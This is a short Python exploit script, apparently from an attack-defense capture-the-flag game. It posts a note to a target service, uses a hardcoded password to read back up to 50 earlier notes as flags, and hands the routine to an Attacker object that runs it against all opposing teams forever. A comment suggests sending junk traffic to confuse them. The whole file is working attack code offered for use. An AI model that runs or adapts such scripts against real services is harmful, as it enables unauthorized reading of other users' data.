from STT.all import *
import requests


def go(ip, port):
    endpoint = "http://" + ip + ":" + str(port)

    # login
    data = {"note": "Whatever note"}
    res = requests.post(endpoint + "/setNote", data)

    noteID = res.json()['noteID']

    flags = ''
    for i in range(noteID-1, max(0, noteID-1-50), -1):
    	res = requests.get(endpoint + "/seeNote?note={}&password=HARDCODED_PASSWORD".format(i))
    	flags += res.text

    return flags


# Define the attacker:
# Here you can also define a <garbage_func> to confuse the other teams.
# (by default there is already a good garbage func if none is defined)
attacker = Attacker(5000, go)
# attacker = Attacker(1337, go, garbage_func = l33t_garbage)

# print attacker.test_exploit(attack_ourselves = True)
attacker.exploit_all_forever()
